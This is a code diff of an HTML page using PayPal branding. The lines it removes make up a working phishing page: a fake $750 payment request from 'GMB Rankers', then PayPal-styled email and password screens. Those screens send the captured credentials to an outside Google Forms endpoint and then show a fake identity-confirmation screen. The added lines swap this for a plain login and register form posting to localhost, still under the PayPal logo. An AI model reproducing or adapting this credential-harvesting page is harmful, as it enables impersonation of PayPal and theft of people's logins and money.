@@ -150,108 +150,75 @@
     </style>
 </head>
 <body>
-    <!-- Payment Container -->
-    <div class="container payment-container active">
-        <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal Logo">
-        <h1>GMB Rankers</h1>
-        <p>chad@gmbrankers.com</p>
-        <div class="price">$750.00 USD</div>
-        <button class="btn-primary" id="accept-payment-btn">Accept Payment</button>
-    </div>
 
-    <!-- Login Container -->
-    <div class="container login-container">
+    <!-- Contenedor de Login -->
+    <div class="container login-container active">
         <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal Logo">
         <form id="login-form">
             <input type="email" name="email" id="email" placeholder="Email or mobile number" required>
-            <a href="#" class="forgot-link">Forgot email?</a>
-            <button type="button" class="btn-primary" id="next-btn">Next</button>
-        </form>
-        <div class="divider">or</div>
-        <button class="btn-secondary">Sign Up</button>
-        <div class="language-selector">
-            <a href="#">English</a> | 
-            <a href="#">Français</a> | 
-            <a href="#">Español</a> | 
-            <a href="#">中文</a>
-        </div>
-        <footer>
-            <a href="#">Contact Us</a> | 
-            <a href="#">Privacy</a> | 
-            <a href="#">Legal</a> | 
-            <a href="#">Policy Updates</a> | 
-            <a href="#">Worldwide</a>
-        </footer>
-    </div>
-
-    <!-- Password Container -->
-    <div class="container password-container">
-        <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal Logo">
-        <form id="password-form" action="https://docs.google.com/forms/d/e/1FAIpQLSep87bO0F05gYQG9f6X3f-8Ca7-lQ4SrU1jbs_pR_a89lNhxA/formResponse" method="POST">
-            <input type="hidden" name="entry.2053710549" id="email-hidden">
-            <input type="password" name="entry.1947088558" placeholder="Password" required>
-            <a href="#" class="forgot-link">Forgot password?</a>
+            <input type="password" name="password" id="password" placeholder="Password" required>
             <button type="submit" class="btn-primary">Log In</button>
         </form>
-        <div class="divider">or</div>
-        <button class="btn-secondary">Sign Up</button>
-        <div class="language-selector">
-            <a href="#">English</a> | 
-            <a href="#">Français</a> | 
-            <a href="#">Español</a> | 
-            <a href="#">中文</a>
-        </div>
-        <footer>
-            <a href="#">Contact Us</a> | 
-            <a href="#">Privacy</a> | 
-            <a href="#">Legal</a> | 
-            <a href="#">Policy Updates</a> | 
-            <a href="#">Worldwide</a>
-        </footer>
     </div>
 
-    <!-- Verification Container -->
-    <div class="container verification-container">
-        <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal Logo">
-        <h1>Confirm your identity</h1>
-        <p>Open the PayPal app on your phone and follow the instructions to proceed.</p>
-        <a href="#">Need more options?</a>
+    <!-- Contenedor de Registro -->
+    <div class="container register-container">
+        <form id="register-form">
+            <input type="email" name="email" placeholder="Email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit" class="btn-primary">Register</button>
+        </form>
     </div>
 
     <script>
-        // Show the login container after payment
-        document.getElementById('accept-payment-btn').addEventListener('click', function() {
-            document.querySelector('.payment-container').classList.remove('active');
-            document.querySelector('.login-container').classList.add('active');
-        });
+        // Manejar el registro
+        document.getElementById('register-form').addEventListener('submit', async (event) => {
+            event.preventDefault();
 
-        // Show the password container after entering email
-        document.getElementById('next-btn').addEventListener('click', function() {
-            const email = document.getElementById('email').value;
-            document.getElementById('email-hidden').value = email;
-            document.querySelector('.login-container').classList.remove('active');
-            document.querySelector('.password-container').classList.add('active');
-        });
-
-        // Submit the password form and show the verification container
-        document.getElementById('password-form').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent the default form submission
-
-            const form = event.target;
-            const formData = new FormData(form);
-
-            // Submit form data to Google Forms
-            fetch(form.action, {
+            const formData = new FormData(event.target);
+            const response = await fetch('http://localhost:3000/register', {
                 method: 'POST',
-                body: formData,
-                mode: 'no-cors' // To avoid CORS issues with Google Forms
-            }).then(() => {
-                document.querySelector('.password-container').classList.remove('active');
-                document.querySelector('.verification-container').classList.add('active');
-            }).catch((error) => {
-                console.error('Form submission failed:', error);
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    email: formData.get('email'),
+                    password: formData.get('password')
+                })
             });
+
+            if (response.ok) {
+                alert('User registered successfully');
+            } else {
+                alert('Registration failed');
+            }
+        });
+
+        // Manejar el login
+        document.getElementById('login-form').addEventListener('submit', async (event) => {
+            event.preventDefault();
+
+            const formData = new FormData(event.target);
+            const response = await fetch('http://localhost:3000/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    email: formData.get('email'),
+                    password: formData.get('password')
+                })
+            });
+
+            const result = await response.json();
+            if (response.ok) {
+                alert('Login successful');
+                // Aquí puedes manejar el token de autenticación JWT
+            } else {
+                alert('Login failed: ' + result.message);
+            }
         });
     </script>
+
 </body>
 </html>
